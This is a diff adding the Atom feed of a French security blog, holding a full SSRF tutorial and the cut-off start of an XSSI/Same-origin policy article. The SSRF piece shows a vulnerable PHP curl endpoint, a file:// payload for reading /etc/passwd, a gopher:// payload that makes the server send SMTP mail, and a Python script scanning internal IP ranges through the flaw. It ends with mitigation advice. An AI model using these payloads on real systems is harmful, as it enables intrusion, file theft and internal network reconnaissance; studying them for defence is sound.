@@ -1,0 +1,426 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Daily Security - Failles Web</title><link href="https://www.dailysecurity.fr/" rel="alternate"></link><link href="https://www.dailysecurity.fr/tag/failles-web/feed/index.xhtml" rel="self"></link><id>https://www.dailysecurity.fr/</id><updated>2017-09-16T00:40:00+02:00</updated><entry><title>Les Server Side Request Forgery : Comment contourner un pare-feu</title><link href="https://www.dailysecurity.fr/server-side-request-forgery" rel="alternate"></link><published>2017-09-16T00:40:00+02:00</published><updated>2017-09-16T00:40:00+02:00</updated><author><name>Geluchat</name></author><id>tag:www.dailysecurity.fr,2017-09-16:/server-side-request-forgery</id><summary type="html">&lt;h2&gt;Qu'est ce que les Server Side Request Forgery ?&lt;/h2&gt;
+&lt;p&gt;Les &lt;strong&gt;Server Side Request Forgery&lt;/strong&gt;, ou en abrégé &lt;strong&gt;SSRF&lt;/strong&gt;, sont des vulnérabilités Web permettant de lire des fichiers sur le serveur &lt;strong&gt;local&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Il ne faut pas les confondre avec les &lt;strong&gt;CSRF&lt;/strong&gt; (Cross Site Request Forgery), qui, elles, ont pour but l'exécution d'une …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Qu'est ce que les Server Side Request Forgery ?&lt;/h2&gt;
+&lt;p&gt;Les &lt;strong&gt;Server Side Request Forgery&lt;/strong&gt;, ou en abrégé &lt;strong&gt;SSRF&lt;/strong&gt;, sont des vulnérabilités Web permettant de lire des fichiers sur le serveur &lt;strong&gt;local&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Il ne faut pas les confondre avec les &lt;strong&gt;CSRF&lt;/strong&gt; (Cross Site Request Forgery), qui, elles, ont pour but l'exécution d'une requête à l'insu d'un autre utilisateur.&lt;/p&gt;
+&lt;p&gt;Un des gros avantages des &lt;strong&gt;SSRF&lt;/strong&gt; est la possibilité de contourner les &lt;strong&gt;pare-feux&lt;/strong&gt;. &lt;/p&gt;
+&lt;p&gt;En effet, les actions se faisant côté serveur, il est possible d'interroger des services n'étant disponibles que localement tels que : &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Des bases de données NoSQL : Redis, MongoDB.&lt;/li&gt;
+&lt;li&gt;Des bases de données relationnelles : Oracle, MSSQL, MySQL, PostgreSQL.&lt;/li&gt;
+&lt;li&gt;Des services mail : Postfix, Dovecot.&lt;/li&gt;
+&lt;li&gt;Des services Web accessibles localement.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Ce genre de faille est particulièrement présent sur les proxy Web : Un utilisateur du service proxy peut avoir accès à des données internes au serveur, données auxquelles il n'aurait normalement pas du avoir accès.&lt;/p&gt;
+&lt;p&gt;Le schéma suivant montre un exemple d'attaque sur un proxy Web n'ayant pas protégé son adresse locale contre les &lt;strong&gt;SSRF&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Schéma SSRF Proxy" src="https://www.dailysecurity.fr/images/Schema_SSRF_Proxy.png"&gt;&lt;/p&gt;
+&lt;p&gt;On remarque que l'adresse locale est résolue côté serveur et permet à l'attaquant de récupérer le contenu du dossier &lt;em&gt;secret&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Voyons maintenant les différents types d'exploitation possibles en rapport avec les &lt;strong&gt;SSRF&lt;/strong&gt;.&lt;/p&gt;
+&lt;h2&gt;Comment exploiter une SSRF : Les schémas d'attaque&lt;/h2&gt;
+&lt;p&gt;Nous avons vus précédemment l'exemple de l'exploitation d'un &lt;strong&gt;proxy Web&lt;/strong&gt;, mais il existe une multitude de schémas d'attaque.&lt;/p&gt;
+&lt;p&gt;L'exemple du proxy Web utilise le protocole HTTP pour accéder à des données internes.    &lt;/p&gt;
+&lt;p&gt;Nous sommes alors en droit de nous poser une question :  &lt;br&gt;
+&lt;em&gt;Comment faire pour communiquer avec les autres services (bases de données, services e-mail, etc...) ?&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Prenons l'exemple suivant :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt; 
+
+&lt;span class="nv"&gt;$curl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;curl_init&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="nb"&gt;curl_setopt_array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$curl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+    &lt;span class="nx"&gt;CURLOPT_URL&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;url&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="p"&gt;));&lt;/span&gt;
+
+&lt;span class="nv"&gt;$resp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;curl_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$curl&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="nb"&gt;curl_close&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$curl&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Cet exemple prend en entrée une adresse et récupère la page associée, le module curl de PHP est une simple adaptation de la commande système &lt;code&gt;curl http://votreurl.com&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;On peut donc utiliser toutes les fonctionnalités de &lt;strong&gt;curl&lt;/strong&gt;, en particulier celles liées à la sémantique de l'adresse envoyée au script :
+&lt;code&gt;[protocole]://[IP|nomDeDomaine]:[port]/[param]&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Le plus important, le protocole à utiliser : http, https, ftp, &lt;strong&gt;gopher&lt;/strong&gt;, &lt;strong&gt;file&lt;/strong&gt;, dict, etc.&lt;/li&gt;
+&lt;li&gt;L'adresse.&lt;/li&gt;
+&lt;li&gt;Le port distant.&lt;/li&gt;
+&lt;li&gt;Un ou plusieurs paramètres d'accès, par exemple un dossier ou un fichier.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;La liste des protocoles implémentés par curl est disponible &lt;a href="https://curl.haxx.se/docs/manpage.html"&gt;ici&lt;/a&gt;.&lt;/p&gt;
+&lt;h3&gt;Les protocoles &lt;em&gt;file://&lt;/em&gt; et &lt;em&gt;http://&lt;/em&gt;&lt;/h3&gt;
+&lt;p&gt;Un protocole attire notre attention : le protocole &lt;em&gt;file://&lt;/em&gt; , celui-ci permet d'ouvrir un fichier sur le serveur. &lt;/p&gt;
+&lt;p&gt;En utilisant le script précédent, on peut essayer de lire le fichier /etc/passwd sur le serveur, ce qui donne en action : 
+&lt;img alt="SSRF File" src="https://www.dailysecurity.fr/images/SSRF_File.png"&gt;&lt;/p&gt;
+&lt;p&gt;Nous avons maintenant accès à n'importe quel fichier du serveur ! 
+&lt;img src="https://www.dailysecurity.fr/images/yes.gif" alt="Yes" style="width: 20%;"&gt;&lt;/p&gt;
+&lt;p&gt;Le protocole &lt;em&gt;file://&lt;/em&gt; nous a permis d'accéder à des fichiers mais &lt;em&gt;comment faire pour communiquer avec les différents services présents sur la machine ?&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;L'&lt;a href="http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html"&gt;excellent article&lt;/a&gt; de &lt;a href="https://twitter.com/Agarri_FR"&gt;Nicolas Grégoire&lt;/a&gt; est un très bon exemple de &lt;strong&gt;SSRF&lt;/strong&gt; sur un service : la base de données NoSQL &lt;strong&gt;Redis&lt;/strong&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Redis&lt;/strong&gt;, comme MongoDB, est une base de données NoSQL &lt;strong&gt;sans authentification&lt;/strong&gt; par défaut. &lt;/p&gt;
+&lt;p&gt;L'article explique comment, à l'aide de requêtes HTTP, &lt;em&gt;extraire&lt;/em&gt; des données de la base, &lt;em&gt;modifier&lt;/em&gt; cette dernière ou même &lt;em&gt;lire&lt;/em&gt; des fichiers sur le système.&lt;/p&gt;
+&lt;p&gt;Le principal souci de cette méthode est qu'une requête HTTP est obligée d'avoir un format spécifique afin d'être correcte : &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="go"&gt;GET /index.html&lt;/span&gt;
+&lt;span class="go"&gt;Host: www.dailysecurity.fr&lt;/span&gt;
+&lt;span class="go"&gt;User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&lt;/span&gt;
+&lt;span class="go"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
+&lt;span class="go"&gt;Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
+&lt;span class="go"&gt;Accept-Encoding: gzip, deflate, br&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ce format restreint l'exploitation de service, par exemple l'accès à un service qui a besoin d'un préambule bien précis.&lt;/p&gt;
+&lt;p&gt;Exemple d'accès à la base de données Redis avec une requête HTTP :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-ERR wrong number of arguments for &amp;#39;get&amp;#39; command
+-ERR unknown command &amp;#39;Host:&amp;#39;
+-ERR unknown command &amp;#39;Accept:&amp;#39;
+-ERR unknown command &amp;#39;Accept-Encoding:&amp;#39;
+-ERR unknown command &amp;#39;Connection:&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Le protocole &lt;em&gt;gopher://&lt;/em&gt;&lt;/h3&gt;
+&lt;p&gt;Afin de palier au problème de format, nous pouvons utiliser le protocole &lt;em&gt;gopher://&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/Gopher_(protocol)"&gt;Gopher&lt;/a&gt; est un protocole concurrent de HTTP qui n'est plus vraiment utilisé mais toujours supporté par curl.&lt;/p&gt;
+&lt;p&gt;Il va nous permettre de communiquer avec les services type &lt;em&gt;telnet&lt;/em&gt; comme par exemple le service SMTP (e-mail) : &lt;br&gt;
+&lt;em&gt;ps : 1. Pour les sauts de ligne, on doit les encoder deux fois.&lt;/em&gt; &lt;br&gt;
+&lt;em&gt;2. La première lettre de la requête est aléatoire (x dans l'exemple) car non prise en compte par le protocole gopher.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;On cherche à envoyer un e-mail en utilisant le serveur SMTP disponible localement.&lt;/p&gt;
+&lt;p&gt;Contenu du message :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;HELO localhost
+MAIL FROM:&amp;lt;hacker@site.com&amp;gt;
+RCPT TO:&amp;lt;victim@site.com&amp;gt;
+DATA
+From: [Hacker] &amp;lt;hacker@site.com&amp;gt;
+To: &amp;lt;victime@site.com&amp;gt;
+Date: Tue, 15 Sep 2017 17:20:26 -0400
+Subject: Ah Ah AH
+
+You didn&amp;#39;t say the magic word !
+
+
+.
+QUIT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ce qui donne en version Gopher : 
+&lt;a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ"&gt;https://victim.website/curl.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Pour tester notre &lt;strong&gt;SSRF&lt;/strong&gt;, on met en place un serveur netcat sur le port 25 (associé au protocole SMTP) et on attend la requête :     &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="go"&gt;nc -lvp 25&lt;/span&gt;
+&lt;span class="go"&gt;listening on [any] 25 ...&lt;/span&gt;
+&lt;span class="go"&gt;connect to [127.0.0.1] from localhost [127.0.0.1] 35417&lt;/span&gt;
+&lt;span class="go"&gt;HELO localhost&lt;/span&gt;
+&lt;span class="go"&gt;MAIL FROM:&amp;lt;hacker@site.com&amp;gt;&lt;/span&gt;
+&lt;span class="go"&gt;RCPT TO:&amp;lt;victim@site.com&amp;gt;&lt;/span&gt;
+&lt;span class="go"&gt;DATA&lt;/span&gt;
+&lt;span class="go"&gt;From: [Hacker] &amp;lt;hacker@site.com&amp;gt;&lt;/span&gt;
+&lt;span class="go"&gt;To: &amp;lt;victime@site.com&amp;gt;&lt;/span&gt;
+&lt;span class="go"&gt;Date: Tue, 15 Sep 2017 17:20:26 -0400&lt;/span&gt;
+&lt;span class="go"&gt;Subject: AH AH AH&lt;/span&gt;
+
+&lt;span class="go"&gt;You didn&amp;#39;t say the magic word !&lt;/span&gt;
+
+
+&lt;span class="go"&gt;.&lt;/span&gt;
+&lt;span class="go"&gt;QUIT&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/firewall.jpg" alt="Yes" style="width: 50%;"&gt;&lt;/p&gt;
+&lt;h3&gt;Une autre exemple d'utilisation des &lt;em&gt;SSRF&lt;/em&gt; : L'énumération d'adresses IP sur le réseau local&lt;/h3&gt;
+&lt;p&gt;Nous avons vu dans les parties précédentes que les  &lt;strong&gt;SSRF&lt;/strong&gt; jouaient le rôle de proxy afin d’exécuter des requêtes internes.&lt;/p&gt;
+&lt;p&gt;Elles peuvent alors servir d'outil pour l'énumération des machines dans les sous-réseaux accessibles.&lt;/p&gt;
+&lt;p&gt;La seule contrainte est que le machine à détecter doit avoir au moins un service ouvert.&lt;/p&gt;
+&lt;p&gt;Les services les plus communs sont le plus souvent des services Web ou SSH (ports 80, 443, 8080, 22) voire RDP (port 3389) sur Windows.&lt;/p&gt;
+&lt;p&gt;On peut deviner les sous-réseaux accessibles grâce aux fichiers de configuration de Apache ( &lt;code&gt;/etc/apache2/apache2.conf&lt;/code&gt;) ou en cherchant dans les plages d'adresses IP des réseaux privés :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;10.0.0.0/8&lt;/li&gt;
+&lt;li&gt;172.16.0.0/12&lt;/li&gt;
+&lt;li&gt;192.168.0.0/16&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Pour énumérer les machines disponibles ayant un service HTTP sur le port 80 on peut utiliser le script suivant :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;ipRange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;start_ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;end_ip&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+   &lt;span class="n"&gt;start&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;start_ip&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+   &lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;end_ip&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+   &lt;span class="n"&gt;temp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;start&lt;/span&gt;
+   &lt;span class="n"&gt;ip_range&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
+   &lt;span class="n"&gt;ip_range&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;start_ip&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+   &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;temp&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+      &lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+      &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+         &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+            &lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
+            &lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+      &lt;span class="n"&gt;ip_range&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;    
+   &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ip_range&lt;/span&gt;
+
+&lt;span class="n"&gt;ip_range&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ipRange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;192.168.0.0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;192.168.255.255&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;ip_up&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
+&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;ip_range&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://victime.website/curl.php?url=http://&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/:80&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mf"&gt;0.5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+            &lt;span class="n"&gt;ip_up&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[+] Machine : &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;
+    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;pass&lt;/span&gt;
+
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip_up&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;hr&gt;
+&lt;p&gt;Afin de &lt;strong&gt;sécuriser&lt;/strong&gt; une application contre les &lt;strong&gt;SSRF&lt;/strong&gt;, il faut vérifier :     &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Le &lt;em&gt;protocole&lt;/em&gt; utilisé : autoriser seulement &lt;em&gt;http&lt;/em&gt; et &lt;em&gt;https&lt;/em&gt;.&lt;/li&gt;
+&lt;li&gt;L'adresse &lt;em&gt;IP&lt;/em&gt; liée à l'URL demandée ne doit pas faire partie d'un &lt;a href="https://fr.wikipedia.org/wiki/R%C3%A9seau_priv%C3%A9"&gt;réseau privé&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Voilà, c’est déjà terminé, n’hésitez pas à rejoindre mon &lt;a href="https://twitter.com/Geluchat"&gt;Twitter&lt;/a&gt; pour avoir des news sur le site et mon point de vue sur l’actualité de la sécurité informatique.&lt;/p&gt;
+&lt;p&gt;Geluchat.&lt;/p&gt;</content><category term="Journal de Geluchat"></category><category term="SSRF"></category><category term="Failles Web"></category><category term="Tutoriel"></category></entry><entry><title>Les XSSI : Les limites de la Same-origin policy !</title><link href="https://www.dailysecurity.fr/xssi-sop-bypass" rel="alternate"></link><published>2017-09-13T19:30:00+02:00</published><updated>2017-09-13T19:30:00+02:00</updated><author><name>Geluchat</name></author><id>tag:www.dailysecurity.fr,2017-09-13:/xssi-sop-bypass</id><summary type="html">&lt;h2&gt;Qu'est-ce que la Same-origin policy :&lt;/h2&gt;
+&lt;p&gt;La &lt;strong&gt;Same-origin policy&lt;/strong&gt; ou plus simplement &lt;strong&gt;SOP&lt;/strong&gt; est l'une des protections les plus importantes du &lt;strong&gt;navigateur&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Elle sert à vérifier que les contenus chargés sur la page proviennent du &lt;strong&gt;même&lt;/strong&gt; domaine que celle-ci.&lt;/p&gt;
+&lt;p&gt;La &lt;a href="https://developer.mozilla.org/fr/docs/Web/JavaScript/Same_origin_policy_for_JavaScript"&gt;documentation de Firefox&lt;/a&gt; nous donne un tableau qui montre comment fonctionnent …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Qu'est-ce que la Same-origin policy :&lt;/h2&gt;
+&lt;p&gt;La &lt;strong&gt;Same-origin policy&lt;/strong&gt; ou plus simplement &lt;strong&gt;SOP&lt;/strong&gt; est l'une des protections les plus importantes du &lt;strong&gt;navigateur&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Elle sert à vérifier que les contenus chargés sur la page proviennent du &lt;strong&gt;même&lt;/strong&gt; domaine que celle-ci.&lt;/p&gt;
+&lt;p&gt;La &lt;a href="https://developer.mozilla.org/fr/docs/Web/JavaScript/Same_origin_policy_for_JavaScript"&gt;documentation de Firefox&lt;/a&gt; nous donne un tableau qui montre comment fonctionnent ces vérifications :
+&lt;img alt="Documentation SOP Firefox" src="https://www.dailysecurity.fr/images/firefox_sop_doc.png"&gt;&lt;/p&gt;
+&lt;p&gt;Pour faire simple, la &lt;em&gt;SOP&lt;/em&gt; évite qu'un attaquant puisse récupérer des informations d'un &lt;strong&gt;autre site&lt;/strong&gt; avec les droits de l'utilisateur connecté.&lt;/p&gt;
+&lt;p&gt;Prenons l'exemple suivant qui montre un schéma d'attaque avec la SOP désactivée côté utilisateur :
+&lt;img alt="Schéma XSS" src="https://www.dailysecurity.fr/images/schema_xssi.png"&gt;&lt;/p&gt;
+&lt;p&gt;On voit ici que sans la &lt;em&gt;SOP&lt;/em&gt; n'importe quel site visité peut accéder à un autre site en utilisant les cookies de l'utilisateur.&lt;/p&gt;
+&lt;p&gt;Lorsque la &lt;em&gt;SOP&lt;/em&gt; est activée, une erreur apparaitra à l'étape 2 : &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Blocage d’une requête multiorigines (Cross-Origin Request) : la politique « Same Origin » ne permet pas de consulter la ressource distante.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;Les limites de la SOP&lt;/h2&gt;
+&lt;p&gt;Nous avons vu rapidement comment fonctionne la &lt;em&gt;SOP&lt;/em&gt;, reste maintenant à voir les limites de cette protection.&lt;/p&gt;
+&lt;p&gt;En effet, la &lt;em&gt;SOP&lt;/em&gt; doit être assez permissive pour pouvoir afficher des images ou charger du Javascript externe.&lt;/p&gt;
+&lt;p&gt;Les exemples suivants ne sont donc pas soumis à cette protection :&lt;/p&gt;
+&lt;p&gt;La balise &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; :&lt;/p&gt;
